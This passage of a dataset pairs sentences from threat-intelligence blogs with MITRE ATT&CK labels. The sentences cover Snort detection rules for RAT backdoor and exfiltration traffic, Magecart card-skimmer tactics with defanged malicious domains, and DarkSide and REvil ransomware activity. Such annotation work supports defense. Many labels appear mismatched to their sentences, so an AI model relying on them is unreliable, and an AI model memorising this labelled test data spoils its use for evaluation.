1; depth: 4; pcre:\"/\\x00\\x00\\x00\\x00(thumb|filsz|rupth|dowf|endpo|scrsz|cscreen|dirs|stops|scren|cnls|udlt|delt|afile|listf|file|info|runf|fles|dowr|info|fldr)+=/\"; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*\u00a0", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.NetWiredRC - Check-in request\"; flow:established,to\\_server; dsize:69; content:\"|41 00 00 00 99|\"; offset:0; depth:5; flowbits:set,ZS.NetwireRAT.Client; flowbits:noalert; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)*", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.NetWiredRC - Check-in response\"; flow:established,to\\_server; dsize:5; content:\"|3f 00 00 00 9b|\"; flowbits:isset,ZS.NetwireRAT.Client; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)*", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $EXTERNAL\\_NET any -> $HOME\\_NET any (msg:\"Zscaler Win32.Backdoor.AsyncRAT - Malicious SSL Cert\"; flow:established,to\\_client; content:\"|16 03 01|\"; offset:0; depth:3; content:\"AsyncRAT\"; distance:0; fast\\_pattern; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $EXTERNAL\\_NET any -> $HOME\\_NET any (msg:\"Zscaler Win32.Backdoor.QuasarRAT - CNC response header\"; flow:established,to\\_client; dsize:68; content:\"|40 00 00 00|\"; offset: 0; depth: 4; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.AgentTesla CNC via FTP/SMTP\"; flow:established,to\\_server; content:\"|3C|html|3E|Time|3A|\"; content:\"|3C|br|3E|User Name|3A|\"; content:\"|3C|br|3E|Computer Name|3A|\"; distance: 0; content: \"|3C|br|3E|OSFullName|3A|\"; distance: 0; content:\"CPU|3A|\"; distance: 0; content:\"|3C|br|3E|RAM|3A|\"; distance: 0; content: \"URL|3A|\"; distance: 0; content: \"Application|3A|\"; distance: 0; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $HOME\\_NET any -> any any (msg:\"Zscaler Win32.Backdoor.CyberGate - Data Exfiltration\"; flow:established,to\\_server; dsize:40<>300; pcre:\"/\\d{2,3}[#$]{4,6}\\x0d\\x0a/\"; content:\"|23 23 24 23 23 0d 0a|\"; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*", "labels": ["T1059"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.Nanocore Pulse check\"; flow:established,to\\_server; dsize:12; content:\"|08 00 00 00|\"; offset: 0; depth: 4; content:\"*/*c1 c3 d0 32\u00a0 43 59 a1 78|\"; distance:0; within:8; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.Nanocore - Generic C&C command (request)\"; flow:established,to\\_server; flowbits:isset,ZS.NanocoreGen; dsize:12; content:\"|08 00 00 00|\"; offset:0; depth:4; byte\\_test:1,!=,0,5,relative;\u00a0 reference:url,https://zscaler.com;)*", "labels": ["TA0011", "T1059", "T1059", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $EXTERNAL\\_NET any -> $HOME\\_NET any (msg:\"Zscaler Win32.Backdoor.Nanocore - Generic C&C command (response)\"; flow:established,to\\_client; flowbits:noalert; flowbits:set,ZS.NanocoreGen; content:\"|20 00 00 00|\"; offset:0; depth:4; byte\\_test:1,!=,0,5,relative; dsize:36; reference:url,https://zscaler.com;)*", "labels": ["TA0011", "T1059", "T1059", "TA0011"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.NjRat - Data Exfil activity\"; flow:to\\_server,established; content:\"|00|inf\"; offset:3; depth:4; pcre:\"/\\d{1,3}\\x00\\w{1,3}/\"; pcre:\"/(?:[A-Za-z0-9+\\/]{4})*(?:[A-Za-z0-9+\\/]{2}==|[A-Za-z0-9+\\/]{3}=)?/\"; flowbits:isset,ZS.njrat; flowbits:unset,ZS.njrat; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.NjRat - Data Exfil activity\"; flow:to\\_server,established; content:\"|00|ll\"; offset:3; depth:3; pcre:\"/^\\d{1,3}\\x00/\"; pcre:\"/(?:[A-Za-z0-9+\\/]{4})*(?:[A-Za-z0-9+\\/]{2}==|[A-Za-z0-9+\\/]{3}=)?/\"; flowbits:set,ZS.njrat; flowbits:noalert; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-05_catching-rats-over-custom-protocols"}, {"sentence": "Skimmer groups are growing rapidly and targeting various e-commerce platforms using a variety of ways to remain undetected.", "labels": ["TA0005"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "The Zscaler ThreatLabZ\u00a0research team has been tracking these skimmer groups and monitoring the techniques they're using.", "labels": ["T1589"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "The latest techniques include compromising vulnerable versions of e-commerce platforms, hosting skimmer scripts on CDNs and\u00a0cloud services, and using newly registered domains (NRDs) lexically close to any legitimate web service or specific e-commerce store to host malicious skimmer scripts.", "labels": ["T1190", "T1059", "T1566", "T1059"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "In this blog, we will provide an overview of the recent trends we are seeing in JavaScript skimmer attacks.", "labels": ["T1059"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Skimming is a technique by\u00a0which cybercriminals steal credit card information from e-commerce sites and other internet payment portals.", "labels": ["T1589"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Threat actors exploit software vulnerabilities to gain\u00a0access to a website's source code.", "labels": ["T1190"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Once they have access, they\u00a0inject malicious JavaScript that allows them to exfiltrate data.", "labels": ["TA0010"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Historically, the Magento platform has been the most highly targeted in skimmer attacks.", "labels": ["T1589"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "**Newly registered domains (NRDs) in skimmer attacks**", "labels": ["T1589"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "The use of NRDs in skimmer attacks for hosting malicious scripts\u00a0exfiltrating skimmed data\u00a0provides an advantage to attackers since each NRD's lack of reputation makes\u00a0it easy to evade\u00a0reputation-based engines.", "labels": ["TA0010", "T1589", "T1059", "TA0005"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "In most attacks, newly registered domains are typosquatting for legitimate web services, such as Google ads, CDNs, Jquery, Magento, etc., as typosquatting increases the chance of remaining undetected in legitimate traffic.", "labels": ["T1036", "T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Recently, threat actors have most frequently utilized domains lexically close to Google and Google services, followed by domains lexically close to Jquery/ JavaScript and web analytics.", "labels": ["T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "![Trend for newly registered domains lexically close to legitimate services.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/3.PNG)", "labels": ["T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Figure 3: Trend for newly registered domains lexically close to legitimate services.", "labels": ["T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Websites in the shopping category are the most common targets for\u00a0skimmer attacks, but other URL categories have also fallen victim to these attacks, as shown in the following chart:", "labels": ["T1190"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "**Abusing legitimate communication and analytics services in skimmer attacks**", "labels": ["T1567"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Starting last year, we've seen\u00a0skimmer groups abusing legitimate communication and analytics services, such as\u00a0Telegram and Google analytics, for data exfiltration.", "labels": ["T1589", "T1567"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Some of these skimmer techniques can be defeated by configuring Content Security Policy (CSP).", "labels": ["T1589"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "CSP\u00a0is an added layer of web security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks.", "labels": ["T1189"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "These attacks are used for everything from data theft to site defacement to distribution of malware.", "labels": ["TA0010", "T1491"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "By configuring CSP, web admins can specify domains that should be considered valid sources for scripts\u2014though such specifications can often be bypassed by attackers abusing the Google Analytics API, which is used legitimately by a large number of websites.", "labels": ["T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "ThreatLabZ\u00a0observed a significant spike during February and March 2021 in such attacks, where legitimate communication and analytics services are abused, but they have trailed off in recent weeks.", "labels": ["T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "![Hits of skimmer groups abusing legitimate services over 90 days.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/5.PNG)", "labels": ["T1589", "T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Figure 5: Hits of skimmer groups abusing legitimate services over 90 days.", "labels": ["T1589", "T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "**Recent skimmer activity**", "labels": ["T1589"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Recent skimmer attacks have heavily leveraged NRDs for malicious script injection and data exfiltration, as well as the use of compromised\u00a0third-party scripts or CDNs.", "labels": ["TA0010", "T1589", "T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Below are two examples of recent skimmer attacks using NRDs and CDNs to serve\u00a0content to specific websites.", "labels": ["T1589", "T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "**Case 1:** In one of the skimmer attacks, we observed two NRDs involved\u2014one for injecting malicious skimmer code and the other for data exfiltration.", "labels": ["T1589", "T1059", "TA0010"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "These domains are lexically similar to the keywords *jquery* and *CDN*\u00a0to help attacks remain undetected in legitimate traffic.", "labels": ["T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "![Obfuscated skimmer script.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/6.PNG)", "labels": ["T1589"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Figure 6: Obfuscated skimmer script.", "labels": ["T1027"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "The skimmer script has a Base64-encoded fake payment page and skimmed data is sent to the attacker-controlled domain.", "labels": ["T1059", "T1132"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "![Data exfiltration domain and base64 encoded fake payment page.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/7.PNG)", "labels": ["TA0010", "T1027"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Figure 7: Data exfiltration domain and Base64-encoded fake payment page.", "labels": ["T1027", "T1027"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Currently, both of these NRDs are resolving to the same IP 34.125.186[.]248, which hosts multiple (possible) skimmer domains lexically close to legitimate services.", "labels": ["T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "![Multiple possible skimmer domains resolving to the same IP address.", "labels": ["T1589"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Figure 8: Multiple possible skimmer domains resolving to the same IP address.", "labels": ["T1589"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "In the recent past, these domains resolved to the following IP addresses, each of which hosted\u00a0newly registered domains lexically close to legitimate domains and possibly connected to the skimmer attacks.", "labels": ["T1036", "T1589"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "During our analysis of the above-mentioned IP addresses and domains, we observed that domain ajaxtracker[.]com was resolving to IP address 34.125.186[.]248 from April 26, 2021, to April 29, 2021, and during this time it was connected to the Raccoon Stealer.", "labels": [], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "**Case 2**: We observed another recent chain of Magecart infections on a few German shopping websites.", "labels": [], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "The malicious JavaScript that was being used can be seen below.", "labels": ["T1059"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "![Malicious skimmer script.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/10.PNG)", "labels": ["T1059"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Figure 10: Malicious skimmer script.", "labels": ["T1059"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Once the malicious JavaScript is loaded it calls a function named \"Default\\_Send()\"\u00a0as shown\u00a0in the image below.", "labels": ["T1059"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "![Function to grab all the inputs provided by the victim user](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/11.PNG)", "labels": ["T1056"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Figure 11: Function to grab all the inputs provided by the victim.", "labels": ["T1056"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "The Default\\_send function is responsible for collecting the URL of the infected page and grabbing all the inputs provided by the victim who is shopping on the compromised website.", "labels": ["T1614", "T1056"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "![Function to send victim\u2019s card details to attacker.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/12.PNG)", "labels": ["T1020"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Figure 12: Function to send victim\u2019s card details to attacker.", "labels": ["T1020"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Once the script has collected the data, it will call the SendData function, which has the target URL to which the collected data will be uploaded.", "labels": ["TA0009", "T1041"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "The URL is stored in Base64-encoded format in the SendData function, as\u00a0displayed\u00a0below.", "labels": ["T1027"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "![Base64 encoded data exfiltration domain.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/13.PNG)", "labels": ["T1027", "TA0010"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Figure 13: Base64 encoded data exfiltration domain.", "labels": ["TA0010", "T1027"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "If we decode the Base64 URL, we find that the data was being exfiltrated to the malicious domain google-sanek[.]com.", "labels": ["T1140", "T1041"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "By doing a DNS lookup for the domain, we saw that the domain resolves to the IP\u00a082.148.31[.]214, which\u00a0helps us identify other domains hosted on the same IP involved with Magecart activity.", "labels": [], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "The attacker serves JavaScript using\u00a0legitimate-looking domains\u00a0in an attempt to make the traffic look benign.", "labels": ["T1059", "T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "Skimmer groups continue to infect e-commerce sites in large numbers and improve techniques to remain undetected.", "labels": ["TA0005"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": "The use of newly registered domains lexically close to legitimate domains or services helps attackers evade reputation-based engines, as their domains are too new to have a low rating.", "labels": ["T1036"], "document": "zscaler_2021-05-11_magecart-attacks-2021"}, {"sentence": " Insiders or hackerswho receive instructions directly from a boss and can gain access to raw data and extract the information from a service provider. ", "labels": ["T1199"], "document": "intel471_2021-04-19_china-cybercrime-big-data-privacy"}, {"sentence": "n 2019, seemingly legitimate Chinese companies also were observed providing third-party data crawling services and selling the data collected from unknown victimsto reap a profit in addition to being exploited by underground threat actors. ", "labels": ["TA0010"], "document": "intel471_2021-04-19_china-cybercrime-big-data-privacy"}, {"sentence": "Another law enforcement action in 2021 successfully disrupted the Emotet botnet, which featured a modular loader that could steal credentials and bank details from infected users, as well as distribute other malware.", "labels": ["S0367", "TA0006", "T1105"], "document": "intel471_2021-04-26_financial-cybercrime-2021-jackpotting-atm"}, {"sentence": "One service, first advertised in October 2020, includes the ability to intercept, send and receive text messages; grab payment card data and two-factor authentication (2FA) codes; and steal online banking payment details through web-injects.", "labels": ["T1189"], "document": "intel471_2021-04-26_financial-cybercrime-2021-jackpotting-atm"}, {"sentence": "Another actor, a relative newcomer to the cybercriminal underground, started advertising an Android-focused MaaS that could intercept, send and receive text messages; record an infected device\u2019s screen; grab payment card data; and steal online banking credentials through web-injects.", "labels": ["T1113", "T1189"], "document": "intel471_2021-04-26_financial-cybercrime-2021-jackpotting-atm"}, {"sentence": "The service allegedly also supported a socket secure internet protocol (SOCKS5) proxy and keylogging modules.", "labels": ["T1056"], "document": "intel471_2021-04-26_financial-cybercrime-2021-jackpotting-atm"}, {"sentence": "Intel 471 has observed a number of actors advertise possession of personal bank account login credentials, an organization's employee credentials, as well as system access credentials over the past few months.", "labels": ["TA0006", "TA0006", "TA0006"], "document": "intel471_2021-04-26_financial-cybercrime-2021-jackpotting-atm"}, {"sentence": "On the network access side, one actor Intel 471 is tracking tried to sell unauthorized access to an undisclosed bank in Africa, claiming to have administrator-level access to the organization\u2019s domain controller, access credentials to some databases, the source code of undisclosed applications the organization used, and the bank\u2019s customer data.", "labels": ["T1078", "TA0006"], "document": "intel471_2021-04-26_financial-cybercrime-2021-jackpotting-atm"}, {"sentence": "The compromised account allegedly included domain administrator privileges and enabled access to the company\u2019s product source codes, GitHub software development platform accounts, Amazon Web Services (AWS) accounts, employee email accounts and lists of customer email addresses.", "labels": ["T1078"], "document": "intel471_2021-04-26_financial-cybercrime-2021-jackpotting-atm"}, {"sentence": "Here\u2019s what we know about DarkSide ransomware", "labels": ["T1486"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "With the ransomware incident that [shut down a major fuel pipeline](https://www.washingtonpost.com/business/2021/05/08/cyber-attack-colonial-pipeline/) in the United States, another well-known variant on the cybercrime underground has been thrust into the international spotlight.", "labels": ["T1486", "T1486"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "On May 10, 2021, the U.S. Federal Bureau of Investigation announced the attack on Colonial Pipeline was caused by the DarkSide ransomware variant, which forced the company to halt the pipeline\u2019s operations so Colonial could carry out a full investigation into the event.", "labels": ["T1486"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "While the general public may be hearing DarkSide\u2019s name for the first time, Intel 471 has been tracking those associated with the variant since they first announced their products to the cybercrime underground last year.", "labels": [], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "The following is an examination of how DarkSide rose to prominence among cybercriminals \u2014 which Intel 471 has been tracking since they emerged in the underground \u2014 in an ecosystem that is teeming with actors looking for new ways to extort businesses out of their money.", "labels": [], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "While spotted in the wild as far back as August 2020, DarkSide\u2019s developer \u201cdebuted\u201d the ransomware on the popular Russian-language hacker forum XSS in November 2020, advertising that he was looking for partners in an attempt to adopt an affiliate \u201cas-a-service\u201d model.", "labels": ["T1486", "T1189"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "Soon after, the ransomware was spotted to be behind numerous attacks, including several incidents targeting manufacturers and law firms in Europe and the United States.", "labels": ["T1486"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "These included versions for targeting Microsoft Windows and Linux based systems, enhanced encryption settings, a full-fledged and integrated feature built directly into the management panel that enabled affiliates to arrange calls meant to pressure victims into paying ransoms, and a way to launch a distributed denial-of-service (DDoS).", "labels": ["T1499", "T1486", "T1486", "T1499"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "With respect to DarkSide\u2019s affiliates, there is overlap in how the ransomware was delivered, including affiliates gaining initial network access by exploiting vulnerable software like Citrix, Remote Desktop Web (RDWeb), or remote desktop protocol (RDP), performing lateral movement, and exfiltrating sensitive data before ultimately deploying ransomware.", "labels": ["T1486", "TA0008", "TA0010", "T1486", "T1190", "T1486"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "For initial access to networks, actors usually purchased access credentials on underground forums, conducted brute-force attacks, used spam campaigns to spread malware loaders and/or bought access to popular botnets such as Dridex, TrickBot and ZLoader.", "labels": ["TA0001", "S0183", "T1486", "T1110", "T1566"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "As for post-exploitation tools, the arsenal usually included Cobalt Strike and Metasploit frameworks, Mimikatz and BloodHound.", "labels": ["S0154", "S0521"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "Some of the tactics, techniques and procedures that Intel 471 has observed from DarkSide affiliates:", "labels": [], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "* One prominent actor partnered with network access brokers to source initial access credentials, used the Mega.nz file-sharing service to exfiltrate data from victims, leveraged a PowerShell backdoor for reconnaissance and persistence within corporate networks, and also operating the KPOT information-stealing malware in conjunction with deploying DarkSide.", "labels": ["TA0001", "T1059", "TA0043", "TA0003", "T1078", "T1567"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "* Another actor recruited penetration testers to use VPNs in conjunctions already-obtained network access, allowing attackers to move laterally within the network, exfiltrate sensitive data and deploy ransomware.", "labels": ["TA0010", "T1486", "TA0008"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "DarkSide operators did not take responsibility for the Colonial Pipeline attack or publicly dump any data belonging to the company at the time of this report.", "labels": [], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "The operators pledged in the announcement that they will introduce \u201cmoderation\u201d in the future by carefully checking each company DarkSide affiliates want to encrypt \u201cto avoid social consequences in the future.", "labels": ["T1486"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "This is not the first time DarkSide operators have tried to put PR spin on their actions.", "labels": [], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "It is unknown if DarkSide continued to fund the charities outside of their initial donation.", "labels": [], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "The popularity and increasing maturity of the ransomware-as-a-service model combined with the aging systems that control energy systems is a compounding problem.", "labels": ["T1486"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "As threat actors continue to observe ransomware\u2019s operational success, more cybercriminals likely will want to get in on the action due to its thriving sub-industries (i.e. access brokers, credential shops, and bulletproof hosting) and higher returns when compared other crimes (i.e. targeting bank accounts).", "labels": ["T1486"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "It\u2019s imperative that companies responsible for critical infrastructure understand that insecure systems present a juicy ransomware target to the cybercriminal underground, and proactive defenses will go a long way in preventing future incidents like what happened with Colonial Pipeline.", "labels": ["T1486"], "document": "intel471_2021-05-10_darkside-ransomware-colonial-pipeline-attack"}, {"sentence": "The ransomware attack on Colonial Pipeline has caused a large amount of trouble in the United States.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "Intel 471 has observed numerous ransomware operators and cybercrime forums either claim their infrastructure has been taken offline, amending their rules, or they are abandoning ransomware altogether due to the large amount of negative attention directed their way over the past week.", "labels": ["T1486", "T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "On May 13, 2021, the operators of the DarkSide Ransomware-as-a-Service (RaaS) announced they would immediately cease operations of the DarkSide RaaS program.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "The note DarkSide passed to affiliates.", "labels": [], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "*The approximate date of compensation is May 23 (due to the fact that the deposit is to be put on hold for 10 days on XSS).*", "labels": ["T1189"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "DarkSide was not the only group to make this type of announcement on May 13.", "labels": [], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "Another RaaS group, Babuk, claimed it handed over the ransomware\u2019s source code to \"another team,\" which would continue to develop it under a new brand.", "labels": ["T1486", "S0638", "T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "The group pledged to stay in business, continuing to run a victim name-and-shame blog, while also encouraging other ransomware gangs to switch to a private mode of operation.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "While Babuk pledged to keep its operations running, it may find it difficult to find affiliates.", "labels": ["S0638"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "The forum now prohibits ransomware advertising, sales, ransom negotiation services and similar offers.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "The administrator explained the move by saying ransomware operations are becoming \u201cmore and more toxic\u201d and dangerous for the underground community.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "That announcement caused a ripple effect on the forum, causing other well-known RaaS affiliates to make their own announcements regarding the status of their operations.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "One operator known to be behind the REvil ransomware program announced they would stop promoting their malware on the forum, deleting the forum thread where the service was advertised.", "labels": ["S0496", "T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "The operator said REvil would continue operating on another well-known Russian-language cybercrime forum, but expected that forum would soon also ban all ransomware-related activity.", "labels": ["S0496"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "If that is to occur, the operator said REvil would likely go fully private.", "labels": ["S0496"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "Shortly thereafter, REvil\u2019s operator released coordinated statements with an operator behind the Avaddon RaaS program, announcing an amendment to the \u201crules\u201d of their organizations.", "labels": ["S0496", "T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "Additionally, all other targets need to be pre-approved by the ransomware\u2019s operators prior to actual deployment.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "Intel 471 believes that all of these actions can be tied directly to the reaction related to the high-profile ransomware attacks covered by the media this week.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "However, a strong caveat should be applied to these developments: it\u2019s likely that these ransomware operators are trying to retreat from the spotlight more than suddenly discovering the error of their ways.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "A number of the operators will most likely operate in their own closed-knit groups, resurfacing under new names and updated ransomware variants.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "Intel 471 has observed that BitMix, a popular cryptocurrency mixing service used by Avaddon, DarkSide and REvil has allegedly ceased operations.", "labels": ["S0496"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "Furthermore, there will be ransomware operators that continue with their own operations despite all of this week\u2019s attention.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "On the same day as the coordinated announcements from REvil and Avaddon: Ireland's health service operator [had to shut down all of its IT systems](https://www.reuters.com/technology/irish-health-service-hit-by-ransomware-attack-vaccine-rollout-unaffected-2021-05-14/) due to a \"significant\" ransomware attack.", "labels": ["S0496", "T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "Intel 471 